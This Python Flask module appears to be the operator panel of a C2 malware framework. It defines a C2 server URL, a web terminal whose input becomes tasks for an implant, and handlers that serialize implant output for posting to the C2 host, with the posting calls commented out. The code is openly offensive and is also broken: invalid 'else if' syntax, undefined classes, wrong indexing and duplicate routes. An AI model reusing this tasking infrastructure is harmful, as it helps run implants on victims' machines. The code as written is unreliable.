from flask import Blueprint, session, render_template, redirect, url_for
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired, Length
import secrets
from cvnt.client_pb2 import *
from urllib.parse import urljoin
from cvnt.client_pb2 import Command, ClientTaskRequest, ClientTaskResponse, Packet
from cvnt.constants import opcodes, extras
import requests 
from cvnt.db_operations import make_task

client = Blueprint('client', __name__, template_folder='templates')
c2 = "https://rigmalwarole.com"
task_list = "/client/task/list"
task_create = "/client/task/create"
register = "/client/register"
request = "/client/request"
response = "/client/response"
packet = "/client/packet"


class Terminal(FlaskForm):
    cmd = StringField('=> ', validators=[DataRequired(), Length(1, 400)])

@client.route('/client', methods=['GET', 'POST'])
def index():
    form = Terminal()
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))
    whole = None
    error_message = None  # Initialize the error message to None
    if form.validate_on_submit():
        whole = form.cmd.data
        parts = whole.split(' ', 1)
        leftoverstring = ''
        try:
            firstword, leftoverstring = parts
        except: 
            firstword = parts[0]
        if parts[1] in opcodes:
            msg = Command()
            msg.cmd = firstword
            msg.args = leftoverstring
            print('Slay Baddies your command was received successfully!')
            handle_task_request("implantIdExample", msg.cmd, msg.args)
        else if firstword in extras:
            pass
        else:
            error_message = 'Invalid Command Loser :('  # Set the error message
    return render_template('index.html', form=form, cmd=whole, error_message=error_message)

def valid_command(cmd):
    if cmd not in opcodes or cmd not in extras:
        return False
    return True

def analyze_input(cmd, args):
    pass

def handle_local_request(cmd, args):
    pass
    
# @client.route('/client/task/request', methods=["POST"])
def handle_task_request(implant_id, cmd, args):
    print(f'REQUEST FROM CLIENT')
    tr = TaskRequest()
    tr.TaskID = "sometaskId idk" # needs to be genrerated
    tr.Opcode = to_opcode(cmd)
    tr.args = args

    new_task = make_task(implant_id, tr)

    print("new task made")
    print(new_task)
    db.session.add(new_task)
    print("added task")
    db.session.commit()
    print("committed task")
    return "True"

@client.route(response, methods=["POST"])
def handle_t_response(implant_id, jobID, output):
    print(f'RESPONSE FROM CLIENT')
    r = ClientTaskResponse()
    r.ImplantID = implant_id
    r.JobID = jobID
    r.Output = output
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, response), data = out)

@client.route(response, methods=["POST"])
def handle_packet(msg, csrf):
    print(f'PACKET FROM CLIENT')
    r = Packet()
    r.Message = msg
    r.CSRF = csrf
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, csrf), data = out)
